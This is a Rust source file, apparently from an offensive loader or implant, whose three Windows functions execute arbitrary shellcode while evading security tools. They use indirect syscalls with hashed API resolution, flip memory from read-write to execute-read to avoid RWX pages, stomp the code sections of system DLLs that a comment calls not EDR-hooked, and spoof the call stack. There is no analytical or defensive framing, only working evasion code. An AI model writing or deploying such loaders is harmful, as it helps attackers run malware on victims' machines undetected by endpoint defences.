#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE};

#[cfg(target_os = "windows")]
pub unsafe fn run_no_rwx(shellcode: &[u8]) {
    use crate::evasion::syscalls::get_ssn_h;
    use crate::resolve::api_hash::h;
    use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;

    let (ssn_alloc, tramp_alloc) = match get_ssn_h(h::NT_ALLOC_VM) {
        Some(v) => v,
        None => return,
    };
    let mut base_addr: usize = 0;
    let mut region_size: usize = shellcode.len();
    let process_handle: isize = -1isize;

    crate::evasion::syscalls::indirect_syscall(
        ssn_alloc, tramp_alloc,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        0,
        &mut region_size as *mut usize as usize,
        0x1000 | 0x2000 | 0x200,
        PAGE_READWRITE as usize,
    );

    let ptr = base_addr as *mut u8;
    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());

    let (ssn_prot, tramp_prot) = match get_ssn_h(h::NT_PROT_VM) {
        Some(v) => v,
        None => return,
    };
    let mut old_protect: u32 = 0;
    crate::evasion::syscalls::indirect_syscall(
        ssn_prot, tramp_prot,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        &mut region_size as *mut usize as usize,
        PAGE_EXECUTE_READ as usize,
        &mut old_protect as *mut u32 as usize,
        0,
    );

    let (ssn_thread, tramp_thread) = match get_ssn_h(h::NT_CREATE_THR) {
        Some(v) => v,
        None => return,
    };
    let mut h_thread: isize = 0;
    let status = crate::evasion::syscalls::indirect_syscall_11(
        ssn_thread, tramp_thread,
        &mut h_thread as *mut isize as usize,
        0x001F_FFFF_usize,
        0,
        usize::MAX,
        ptr as usize,
        0,
        0,
        0,
        0,
        0,
        0,
    );
    if status >= 0 && h_thread != 0 {
        let (ssn_wait, tramp_wait) = match get_ssn_h(h::NT_WAIT_OBJ) {
            Some(v) => v,
            None => return,
        };
        crate::evasion::syscalls::indirect_syscall(
            ssn_wait, tramp_wait,
            h_thread as usize, 0, 0, 0, 0, 0,
        );
        if let Some((ssn_close, tramp_close)) = get_ssn_h(h::NT_CLOSE) {
            crate::evasion::syscalls::indirect_syscall(
                ssn_close, tramp_close,
                h_thread as usize, 0, 0, 0, 0, 0,
            );
        }
    }
}

#[cfg(target_os = "windows")]
pub unsafe fn run_stomped(shellcode: &[u8]) -> bool {
    use crate::evasion::module_stomp::stomp_module;

    // Try small, always-present DLLs in order: version < winmm < mpr < wldap32.
    // All have legitimate CFG-registered .text sections; none are EDR-hooked.
    const CANDIDATES: &[&[u8]] = &[
        b"version.dll\0",
        b"winmm.dll\0",
        b"mpr.dll\0",
        b"wldap32.dll\0",
    ];
    for &dll in CANDIDATES {
        if let Some(exec_ptr) = stomp_module(dll, shellcode) {
            let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
            fn_ptr();
            return true;
        }
    }
    false
}

/// Like run_no_rwx but passes execution through the stack-spoof trampoline.
#[cfg(target_os = "windows")]
pub unsafe fn run_no_rwx_spoof(shellcode: &[u8]) {
    use crate::evasion::syscalls::get_ssn_h;
    use crate::resolve::api_hash::h;

    let (ssn_alloc, tramp_alloc) = match get_ssn_h(h::NT_ALLOC_VM) {
        Some(v) => v,
        None => return,
    };
    let mut base_addr: usize = 0;
    let mut region_size: usize = shellcode.len();
    let process_handle: isize = -1isize;

    crate::evasion::syscalls::indirect_syscall(
        ssn_alloc, tramp_alloc,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        0,
        &mut region_size as *mut usize as usize,
        0x1000 | 0x2000 | 0x200,
        PAGE_READWRITE as usize,
    );

    let ptr = base_addr as *mut u8;
    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());

    let (ssn_prot, tramp_prot) = match get_ssn_h(h::NT_PROT_VM) {
        Some(v) => v,
        None => return,
    };
    let mut old_protect: u32 = 0;
    crate::evasion::syscalls::indirect_syscall(
        ssn_prot, tramp_prot,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        &mut region_size as *mut usize as usize,
        PAGE_EXECUTE_READ as usize,
        &mut old_protect as *mut u32 as usize,
        0,
    );

    let fn_ptr: extern "C" fn() = core::mem::transmute(ptr);
    crate::evasion::stack_spoof::spoof_and_call(fn_ptr);
}
